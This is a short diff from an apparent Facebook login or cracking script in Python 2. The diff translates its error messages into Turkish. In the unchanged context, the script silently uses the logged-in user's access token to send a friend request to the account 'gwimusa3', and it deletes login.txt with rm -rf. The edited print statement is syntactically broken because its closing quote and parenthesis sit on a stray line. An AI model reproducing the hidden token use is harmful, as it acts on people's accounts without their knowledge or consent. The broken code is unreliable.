@@ -201,7 +201,7 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+				print"\n\033[1;96m[!] \x1b[1;91minternet Bağlantısı Yok"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
@@ -209,7 +209,7 @@ def login():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mŞifre/E-Mail Yanlıs
+			print("\n\033[1;96m[!] \x1b[1;91mŞifre/E-Mail Yanlış"
 ")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
